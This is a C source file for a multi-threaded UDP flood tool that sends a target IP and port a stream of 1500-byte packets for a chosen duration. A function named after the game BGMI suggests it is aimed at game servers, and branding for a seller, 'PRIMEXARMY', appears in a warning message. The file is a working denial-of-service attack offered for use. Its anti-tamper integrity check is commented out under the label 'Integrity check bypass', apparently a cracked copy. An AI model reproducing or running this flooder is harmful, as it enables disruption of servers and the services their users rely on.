#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/evp.h>
#include <openssl/crypto.h>

#define EXPECTED_SHA256_CHECKSUM "0000000000000000000000000000000000000000000000000000000000000000"
#define PROGRAM_EXPIRY_DATE 1764672000 

typedef struct {
    char ip[16];
    int port;
    int duration;
} thread_data_t;

void print_modify_warning_and_terminate() {
    fprintf(stderr, "Buy new from PRIMEXARMY @PRIME_X_ARMY. Deleting you can't modify code by PRIMEXARMY @PRIME_X_ARMY\n");
    exit(EXIT_FAILURE);
}

int check_sha256_integrity(const char *filename) {
    EVP_MD_CTX *mdctx = NULL;
    FILE *file = NULL;
    unsigned char hash[EVP_MAX_MD_SIZE];
    unsigned int hash_len;
    char calculated_checksum[EVP_MAX_MD_SIZE * 2 + 1];
    char buffer[1024];
    size_t bytes;

    if (!(mdctx = EVP_MD_CTX_new()) || EVP_DigestInit_ex(mdctx, EVP_sha256(), NULL) != 1) {
        if (mdctx) EVP_MD_CTX_free(mdctx);
        return 0;
    }

    if (!(file = fopen(filename, "rb"))) {
        EVP_MD_CTX_free(mdctx);
        return 0;
    }

    while ((bytes = fread(buffer, 1, sizeof(buffer), file)) != 0) {
        if (EVP_DigestUpdate(mdctx, buffer, bytes) != 1) {
            fclose(file);
            EVP_MD_CTX_free(mdctx);
            return 0;
        }
    }
    fclose(file);

    if (EVP_DigestFinal_ex(mdctx, hash, &hash_len) != 1) {
        EVP_MD_CTX_free(mdctx);
        return 0;
    }
    EVP_MD_CTX_free(mdctx);

    for (int i = 0; i < hash_len; i++) {
        sprintf(calculated_checksum + i * 2, "%02x", hash[i]);
    }
    calculated_checksum[hash_len * 2] = '\0';

    if (strcasecmp(calculated_checksum, EXPECTED_SHA256_CHECKSUM) != 0) {
        return 0; 
    }
    return 1;
}

int check_expiry() {
    time_t current_time = time(NULL);
    if (current_time > PROGRAM_EXPIRY_DATE) {
        return 0; 
    }
    return 1; 
}

void fill_bgmi_payload(void *payload, size_t len) {
    memset(payload, 0x42, len); 
}

void *send_random_packets(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int sockfd;
    struct sockaddr_in servaddr;
    char payload[1500];
    time_t start_time = time(NULL);
    time_t current_time;

    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(data->port);

    if (inet_pton(AF_INET, data->ip, &servaddr.sin_addr) <= 0) {
        close(sockfd);
        pthread_exit(NULL);
    }

    do {
        fill_bgmi_payload(payload, sizeof(payload));
        sendto(sockfd, payload, sizeof(payload), 0,
               (const struct sockaddr *)&servaddr, sizeof(servaddr));
        usleep(100);
        current_time = time(NULL);
    } while (current_time < start_time + data->duration);

    close(sockfd);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    const char *program_name = argv[0];

    // Integrity check bypass
    /*
    if (!check_sha256_integrity(program_name)) {
        print_modify_warning_and_terminate();
        return EXIT_FAILURE;
    }
    */
    
    if (!check_expiry()) {
        printf("Program expired.\n");
        return EXIT_FAILURE;
    }

    if (argc != 4) {
        fprintf(stderr, "Usage: %s <IP> <port> <duration>\n", program_name);
        return EXIT_FAILURE;
    }

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    
    thread_data_t thread_data;
    strncpy(thread_data.ip, ip, sizeof(thread_data.ip) - 1);
    thread_data.ip[sizeof(thread_data.ip) - 1] = '\0';
    thread_data.port = port;
    thread_data.duration = duration;

    int num_threads = 4;
    pthread_t *threads = (pthread_t *)malloc(num_threads * sizeof(pthread_t));
    if (threads == NULL) {
        return EXIT_FAILURE;
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, send_random_packets, &thread_data);
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    free(threads);
    return 0;
}
